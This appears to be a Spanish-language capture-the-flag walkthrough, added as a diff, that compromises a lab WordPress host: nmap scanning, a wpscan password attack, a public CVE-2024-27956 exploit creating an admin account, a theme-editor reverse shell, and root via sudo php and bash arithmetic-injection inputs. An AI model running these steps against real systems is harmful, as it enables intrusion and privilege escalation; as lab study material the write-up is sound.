@@ -1,0 +1,86 @@
+# Escaneo de Puertos, Servicios y versiones
+nmap -Pn -n -sS -p- -sV --script vuln --min-rate 5000 -vvv -oN nmap 172.17.0.2
+
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+
+el resultado del escaneo nos indica que estamos frente a un wordpress y un usuario mario
+asi que pasamos a aplicarle fuerza bruta a ver si conseguimos la clave
+
+# ataque de diccionario al panel de login
+
+wpscan --url http://172.17.0.2 -U mario -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -t 10
+
+no obtenemos resultados
+
+en el servicio web podemos observar >>>>> Created by Master 2024 && Automated By wp-automatic 3.92.0 <<<<<<<
+buscando un exploit para wp-automatic 3.92.0, vemos que si es vulnerable y conseguimos el siguiente exploit en github:
+https://github.com/diego-tella/CVE-2024-27956-RCE/tree/main
+
+este exploit se aprovecha de la version vulnerable y crea un usuario y contrasena para loguearnos 
+=====================================================
+python3 exploit.py http://172.17.0.2
+
+[+] Exploit for CVE-2024-27956
+[+] Creating user eviladmin
+[+] Giving eviladmin administrator permissions
+[+] Exploit completed!
+[+] administrator created: eviladmin:admin
+
+=====================================================
+
+ahora nos logueamos con eviladmin:admin
+
+despues de acceder al panel de wordpress, nos vamos al apartado de:
+apariencia >>> editaar temas 
+
+aqui vamos editar algun archivo existente php para cargar una reverse shell, en este caso le cargamos un 
+codigo php malicioso para obtener la reverse shell por netcat, asi que nos podemos en escucha
+
+despues le damos en update file y ganamos el acceso remoto por netcat
+
+=====================================================
+
+tratamos la tty 
+sudo -l 
+
+vemos que podemos ejecutar el binario php como pylon, buscamos con searchbins el binario php
+
+searchbins -b php -f sudo
+
+	| CMD="/bin/sh"
+	| sudo php -r "system('$CMD');"
+
+ahora ejecutamos en la maquina comprometida:
+
+CMD="/bin/bash"
+sudo -u pylon /usr/bin/php -r "system('$CMD');"
+
+>>>>>ahora somos pylon
+
+sudo -l
+ 
+(mario) NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
+
+podemos probar ahora si es posible una escalada con >>>> Bash eq Privilege Escalation <<<<<
+
+sudo -u mario /bin/bash /home/mario/pingusorpresita.sh
+Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[$(date >&2)]+1
+Fri Aug 23 19:14:48 CEST 2024
+https://elrincondelhacker.es
+
+como podemos ver, si es posible la ejecucion de comandos, asi que ahora escaleremos a mario
+
+sudo -u mario /bin/bash /home/mario/pingusorpresita.sh
+Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[$(/bin/bash >&2)]+1
+
+>>>>>>>ahora somos mario
+
+sudo -l 
+(root) NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
+
+aplicamos la misma que con el usuario anterior para escalar a root
+
+sudo -u root /bin/bash /home/pylon/pylonsorpresita.sh
+Escribe 1 para ver el canal de pylon: a[$(/bin/bash >&2)]+1
+
+#root
